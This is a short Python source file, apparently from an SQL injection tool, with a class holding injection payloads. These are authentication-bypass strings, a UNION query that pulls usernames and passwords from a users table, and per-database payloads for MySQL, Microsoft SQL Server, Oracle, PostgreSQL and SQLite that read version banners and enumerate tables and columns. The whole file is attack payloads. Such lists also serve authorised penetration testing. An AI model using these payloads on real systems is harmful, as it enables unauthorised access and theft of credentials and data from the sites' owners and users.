class Query:
	tests = [
        "'",   
        "' --'",
        "' AND '1'='2",  # Always false fdor boolean 
        "1' OR '1'='1",  # Always true for authentification
        "' OR '1'='1",   # Always true for authentification
        "' OR 1=1--",    # Always true for authentification
        "' UNION SELECT NULL--",  # Check for column
        "' UNION SELECT username,password FROM users--  " # direct extraction
    ]

	versions = {
        'MySQL': "' UNION SELECT @@version--",
        'Microsoft': "' UNION SELECT @@version--",
        'Oracle': "' UNION SELECT banner FROM v$version WHERE rownum = 1--",
        'PostgreSQL': "' UNION SELECT version()--",
        'SQLite': "' UNION SELECT sqlite_version()--"
    }

	tables = {
        'MySQL': "' UNION SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE'--",
        'Microsoft': "' UNION SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE'--",
        'Oracle': "' UNION SELECT table_name FROM all_tables--",
        'PostgreSQL': "' UNION SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%' ORDER BY relname;--",
        'SQLite': "' UNION SELECT name FROM sqlite_master WHERE type='table'--"
    }

	columns = {
		'MySQL': "' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'Users'--",
        'Microsoft': "' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'Users'--",
        'Oracle': "' UNION SELECT column_name FROM all_cons_columns WHERE table_name = 'USERS'--",
        'PostgreSQL': "' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users'--",
        'SQLite': "' UNION SELECT sql FROM sqlite_master WHERE name='users'--" 
	}